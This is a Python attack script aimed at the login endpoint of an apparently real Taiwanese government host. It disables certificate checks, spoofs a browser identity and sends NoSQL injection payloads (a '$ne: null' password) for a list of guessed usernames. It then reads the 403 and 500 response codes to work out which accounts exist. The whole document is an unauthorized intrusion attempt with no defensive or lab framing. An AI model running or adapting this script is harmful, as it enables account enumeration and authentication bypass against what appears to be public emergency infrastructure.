import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body,tag):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== $and[{$ne:null}] vs $and[{username:$eq:u}] 区分存在性 ===")
print("(403=匹配多/存在, 500=匹配0/唯一崩溃)")
# $ne 已知=403(多). 用 $and 加 username 前缀收窄
cands=["admin","root","tpf","epcr","operator","dispatch","port","system","test","119","911","user"]
for u in cands:
    # username 精确 + password $ne
    b={"username":u,"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    code,t=login(b,u)
    exists="EXISTS(1 doc?)" if code==500 else "MULTI(403)/none"
    print(f"  username={u:10s} password=$ne -> {code} | {exists} | {t[:35]}")
    time.sleep(0.08)
print("DONE")
